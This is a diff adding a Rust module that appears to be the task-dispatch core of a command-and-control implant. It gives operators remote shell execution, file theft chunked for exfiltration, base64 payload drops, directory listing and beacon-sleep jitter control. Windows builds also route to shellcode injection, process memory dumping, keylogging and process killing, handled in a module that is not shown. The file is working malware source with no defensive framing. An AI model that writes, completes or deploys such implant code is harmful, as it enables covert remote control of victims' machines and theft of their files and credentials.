@@ -1,0 +1,251 @@
+use std::sync::{Arc, Mutex};
+
+use base64::Engine;
+
+use crate::profile::parse_duration;
+use crate::wire::ExfilChunk;
+
+// The verb registry: string-in, string-out handlers over the shared task
+// grammar, the same argument shapes the .NET reference implant documents
+// (Files.cs, Exec.cs, BeaconSleep.cs) so operator muscle memory and the UI
+// carry across implants unchanged.
+
+/// The live cadence a beacon.sleep retune mutates (sleep seconds, jitter
+/// half-width seconds).
+pub type Cadence = Arc<Mutex<(f64, f64)>>;
+
+/// Every verb this binary compiled, in advertised order. The handshake
+/// advertises the baked class verbs intersected with this set. The sets are
+/// cfg'd whole: attributes do not apply to array elements.
+#[cfg(windows)]
+pub const COMPILED_VERBS: &[&str] = &[
+    "shell.exec",
+    "file.pull",
+    "file.push",
+    "fs.list",
+    "beacon.sleep",
+    "proc.kill",
+    "inject.shellcode",
+    "collect.minidump",
+    "collect.keylog",
+];
+
+#[cfg(not(windows))]
+pub const COMPILED_VERBS: &[&str] = &[
+    "shell.exec",
+    "file.pull",
+    "file.push",
+    "fs.list",
+    "beacon.sleep",
+];
+
+/// One chunk per 512 KiB: comfortably under the frame-layer sizing budget
+/// the proto documents ("a single frame stays well under 1 MiB").
+const CHUNK_BYTES: usize = 512 * 1024;
+
+/// The single-frame inline cap for file.pull: bytes at or under it return in
+/// the TaskResult, larger streams ride exfil chunks.
+const MAX_INLINE_BYTES: usize = 1 << 20;
+
+/// The inline file.push cap: base64 that decodes past it is refused with the
+/// ceiling named (staged uploads carry anything larger).
+const MAX_PUSH_BYTES: usize = 8 << 20;
+
+pub struct HandlerOutput {
+    pub outcome: Outcome,
+    pub output: String,
+    pub chunks: Vec<ExfilChunk>,
+}
+
+#[derive(Clone, Copy, PartialEq)]
+pub enum Outcome {
+    Succeeded,
+    Failed,
+}
+
+impl HandlerOutput {
+    fn ok(output: String) -> HandlerOutput {
+        HandlerOutput { outcome: Outcome::Succeeded, output, chunks: Vec::new() }
+    }
+    fn ok_with_chunks(output: String, chunks: Vec<ExfilChunk>) -> HandlerOutput {
+        HandlerOutput { outcome: Outcome::Succeeded, output, chunks }
+    }
+    fn fail(output: String) -> HandlerOutput {
+        HandlerOutput { outcome: Outcome::Failed, output, chunks: Vec::new() }
+    }
+}
+
+/// Dispatches one verb; an unknown verb fails with the grammar named rather
+/// than panicking -- the advertised set should have prevented it, and a
+/// failure the operator can read beats a dropped task.
+pub fn dispatch(verb: &str, arguments: &str, cadence: &Cadence) -> HandlerOutput {
+    match verb {
+        "shell.exec" => shell_exec(arguments),
+        "file.pull" => file_pull(arguments),
+        "file.push" => file_push(arguments),
+        "fs.list" => fs_list(arguments),
+        "beacon.sleep" => beacon_sleep(arguments, cadence),
+        #[cfg(windows)]
+        "proc.kill" => crate::sensitive::proc_kill(arguments),
+        #[cfg(windows)]
+        "inject.shellcode" => crate::sensitive::inject_shellcode(arguments),
+        #[cfg(windows)]
+        "collect.minidump" => crate::sensitive::collect_minidump(arguments),
+        #[cfg(windows)]
+        "collect.keylog" => crate::sensitive::collect_keylog(arguments),
+        _ => HandlerOutput::fail(format!("{verb}: this build carries no handler for the verb")),
+    }
+}
+
+fn shell_exec(arguments: &str) -> HandlerOutput {
+    let command = arguments.trim();
+    if command.is_empty() {
+        return HandlerOutput::fail("shell.exec expects '<command>'".into());
+    }
+    let program = if cfg!(windows) { "cmd" } else { "sh" };
+    let flag = if cfg!(windows) { "/C" } else { "-c" };
+    match std::process::Command::new(program)
+        .arg(flag)
+        .arg(command)
+        .output()
+    {
+        Ok(output) => {
+            let mut text = String::from_utf8_lossy(&output.stdout).into_owned();
+            let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
+            if !stderr.is_empty() {
+                if !text.is_empty() && !text.ends_with('\n') {
+                    text.push('\n');
+                }
+                text.push_str(&stderr);
+            }
+            if output.status.success() {
+                HandlerOutput::ok(text)
+            } else {
+                let code = output.status.code().unwrap_or(-1);
+                HandlerOutput::fail(format!("exit {code}: {text}"))
+            }
+        }
+        Err(err) => HandlerOutput::fail(format!("spawn: {err}")),
+    }
+}
+
+fn file_pull(arguments: &str) -> HandlerOutput {
+    let path = arguments.trim();
+    if path.is_empty() {
+        return HandlerOutput::fail("file.pull expects '<path>'".into());
+    }
+    let metadata = match std::fs::metadata(path) {
+        Ok(metadata) => metadata,
+        Err(_) => return HandlerOutput::fail(format!("stat {path}: file not found")),
+    };
+    if metadata.is_dir() {
+        return HandlerOutput::fail(format!("file.pull refuses to dump a directory: {path}"));
+    }
+    let data = match std::fs::read(path) {
+        Ok(data) => data,
+        Err(err) => return HandlerOutput::fail(format!("read {path}: {err}")),
+    };
+    if data.len() <= MAX_INLINE_BYTES {
+        // The inline shape reports the bytes verbatim, UTF-8 lossy -- the
+        // operator console renders text; binary goes the chunked path.
+        return HandlerOutput::ok(String::from_utf8_lossy(&data).into_owned());
+    }
+    let name = std::path::Path::new(path)
+        .file_name()
+        .map(|n| n.to_string_lossy().into_owned())
+        .unwrap_or_else(|| "artifact".into());
+    let mut chunks = Vec::new();
+    for (index, part) in data.chunks(CHUNK_BYTES).enumerate() {
+        chunks.push(ExfilChunk {
+            task_id: String::new(), // the caller stamps the task id
+            name: name.clone(),
+            content_type: "application/octet-stream".into(),
+            sequence: index as u64,
+            terminal: index == (data.len() + CHUNK_BYTES - 1) / CHUNK_BYTES - 1,
+            data: part.to_vec(),
+        });
+    }
+    HandlerOutput::ok_with_chunks(
+        format!("{}: {} bytes, {} chunks streamed to artifact store", path, data.len(), chunks.len()),
+        chunks,
+    )
+}
+
+fn file_push(arguments: &str) -> HandlerOutput {
+    // The base64 payload is the tail after the last space (base64 contains
+    // no spaces); the path is everything before it, spaces included.
+    let Some(space) = arguments.rfind(' ') else {
+        return HandlerOutput::fail("file.push expects '<path> <base64>'".into());
+    };
+    let path = arguments[..space].trim();
+    let payload = arguments[space + 1..].trim();
+    if path.is_empty() || payload.is_empty() {
+        return HandlerOutput::fail("file.push expects '<path> <base64>'".into());
+    }
+    let data = match base64::engine::general_purpose::STANDARD.decode(payload) {
+        Ok(data) => data,
+        Err(_) => return HandlerOutput::fail("file.push: payload is not valid base64".into()),
+    };
+    if data.len() > MAX_PUSH_BYTES {
+        return HandlerOutput::fail(format!(
+            "file.push: payload of {} bytes exceeds the {MAX_PUSH_BYTES}-byte single-task cap",
+            data.len()
+        ));
+    }
+    if let Some(parent) = std::path::Path::new(path).parent() {
+        let _ = std::fs::create_dir_all(parent);
+    }
+    let length = data.len();
+    match std::fs::write(path, data) {
+        Ok(()) => HandlerOutput::ok(format!("{path}: {length} bytes written")),
+        Err(err) => HandlerOutput::fail(format!("write {path}: {err}")),
+    }
+}
+
+fn fs_list(arguments: &str) -> HandlerOutput {
+    let path = if arguments.trim().is_empty() { "." } else { arguments.trim() };
+    let entries = match std::fs::read_dir(path) {
+        Ok(entries) => entries,
+        Err(err) => return HandlerOutput::fail(format!("list {path}: {err}")),
+    };
+    let mut lines = Vec::new();
+    for entry in entries.flatten() {
+        let metadata = entry.metadata().ok();
+        let name = entry.file_name().to_string_lossy().into_owned();
+        let is_dir = metadata.as_ref().map(|m| m.is_dir()).unwrap_or(false);
+        let size = metadata.as_ref().map(|m| m.len()).unwrap_or(0);
+        // One JSON object per line, the shape the .NET fs.list emits so the
+        // operator UI's line parser reads either implant.
+        lines.push(format!(
+            "{{\"name\":\"{}\",\"dir\":{},\"size\":{}}}",
+            name.replace('\\', "\\\\").replace('"', "\\\""),
+            is_dir,
+            size
+        ));
+    }
+    lines.sort();
+    HandlerOutput::ok(lines.join("\n"))
+}
+
+fn beacon_sleep(arguments: &str, cadence: &Cadence) -> HandlerOutput {
+    let tokens: Vec<&str> = arguments.split_whitespace().collect();
+    if tokens.is_empty() || tokens.len() > 2 {
+        return HandlerOutput::fail(
+            "beacon.sleep: expected \"<sleep> [jitter]\", e.g. \"10s\", \"30 5\", \"0 0\"".into(),
+        );
+    }
+    let sleep = parse_duration(tokens[0]);
+    let mut guard = cadence.lock().expect("cadence");
+    let jitter = if tokens.len() == 2 {
+        parse_duration(tokens[1])
+    } else {
+        guard.1
+    };
+    let prior = *guard;
+    *guard = (sleep, jitter);
+    drop(guard);
+    HandlerOutput::ok(format!(
+        "contact every {sleep}s ± {jitter}s (was {}s ± {}s); applies from the next cycle",
+        prior.0, prior.1
+    ))
+}
